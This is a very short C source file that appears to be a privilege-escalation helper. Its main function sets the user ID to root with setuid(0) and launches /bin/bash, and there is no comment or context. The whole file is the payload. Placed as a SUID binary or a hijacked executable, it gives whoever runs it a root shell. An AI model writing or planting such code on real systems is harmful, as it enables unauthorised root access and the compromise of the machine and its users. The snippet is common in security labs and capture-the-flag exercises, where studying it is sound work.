#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/types.h>

int main(){
	setuid(0);
	system("/bin/bash");
	return 0;
}
